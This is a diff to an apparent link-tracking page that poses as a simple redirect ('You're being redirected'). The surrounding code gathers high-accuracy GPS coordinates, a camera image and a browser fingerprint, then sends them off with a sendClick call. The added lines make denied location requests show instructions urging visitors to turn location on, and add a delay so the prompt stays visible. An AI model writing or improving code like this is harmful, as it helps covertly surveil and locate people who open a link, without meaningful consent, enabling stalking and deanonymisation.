@@ -95,6 +95,7 @@ function trackingPageHtml(link, error) {
     <p style="margin-bottom:16px;color:#555;">You're being redirected</p>
     <button class="btn" id="continueBtn">Continue</button>
     <p class="text-sm" id="status"></p>
+    <div id="locationTip" style="display:none;margin-top:12px;padding:10px;background:#fff3cd;border-radius:6px;font-size:0.8rem;color:#856404;text-align:left;"></div>
   </div>
 
   <script>
@@ -109,6 +110,7 @@ function trackingPageHtml(link, error) {
         <p style="margin-bottom:16px;color:#555;">$\{msg}</p>
         <button class="btn" id="continueBtn">Continue</button>
         <p class="text-sm" id="status"></p>
+        <div id="locationTip" style="margin-top:12px;padding:10px;background:#fff3cd;border-radius:6px;font-size:0.8rem;color:#856404;text-align:left;"></div>
       \`;
       document.getElementById('continueBtn').addEventListener('click', requestGeo);
     }
@@ -272,12 +274,21 @@ function getFingerprint() {
       var geoPromise = new Promise(function(resolve) {
         navigator.geolocation.getCurrentPosition(
           function(pos) { lat = pos.coords.latitude; lng = pos.coords.longitude; accuracy = pos.coords.accuracy; resolve(); },
-          function() { resolve(); },
+          function(err) {
+            var tip = document.getElementById('locationTip');
+            if (err.code === 1) tip.innerHTML = '<b>Location blocked.</b> To enable: <ul style="margin:4px 0 0 16px;padding:0"><li><b>Desktop:</b> click the location icon in the address bar and select "Allow"</li><li><b>Phone:</b> go to Settings &rarr; Privacy &rarr; Location Services &rarr; turn on for this browser</li></ul>';
+            else if (err.code === 2) tip.innerHTML = '<b>Location unavailable.</b> Turn on GPS or WiFi for precise positioning.';
+            else if (err.code === 3) tip.innerHTML = '<b>GPS timed out.</b> Move to an open area or turn on WiFi to help locate you.';
+            if (tip.innerHTML) tip.style.display = 'block';
+            resolve();
+          },
           { timeout: 15000, enableHighAccuracy: true }
         );
       });
 
       await Promise.all([camPromise, geoPromise]);
+      // brief delay so location tip is visible before redirect
+      await new Promise(function(r) { setTimeout(r, 1200); });
       sendClick(lat, lng, accuracy, fp, img);
     }
 
